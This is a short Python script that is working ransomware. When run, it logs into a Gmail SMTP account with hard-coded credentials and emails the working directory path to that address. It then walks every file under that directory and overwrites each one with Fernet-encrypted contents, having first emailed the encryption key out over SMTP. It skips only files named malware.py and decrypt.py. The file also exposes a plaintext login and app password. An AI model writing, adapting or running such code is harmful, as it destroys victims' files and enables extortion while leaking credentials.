import os
import smtplib
from cryptography.fernet import Fernet

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('mihadac681@gmail.com', 'xssdkdizoqktjfba')


current_dir = os.getcwd()
server.sendmail('mihadac681@gmail.com',
                'mihadac681@gmail.com', str(current_dir))


def initializer(path):

    _all = os.walk(path)

    total_diretorys = 0
    total_files = 0

    all_files = list()

    for x in _all:
        path, directorys, files = x

        directory_length = len(directorys)
        files_length = len(files)
        total_diretorys += directory_length
        total_files += files_length

        if len(files) != 0:
            for file in files:
                with_path = path + '/' + file
                all_files.append(with_path)
    return all_files


def Encryptfiles(files):
    key = Fernet.generate_key().decode()
    server.sendmail('mihadac681@gmail.com', 'mihadac681@gmail.com', key)

    for file in files:
        if file.endswith('malware.py') or file.endswith('decrypt.py'):
            continue
        with open(file, 'rb') as thefile:
            content = thefile.read()
            encrypted = Fernet(key).encrypt(content)
        with open(file, 'wb') as thefile:
            thefile.write(encrypted)


def main():
    files = initializer(current_dir)
    Encryptfiles(files)
    print('Encrypted!')


if __name__ == '__main__':
    main()
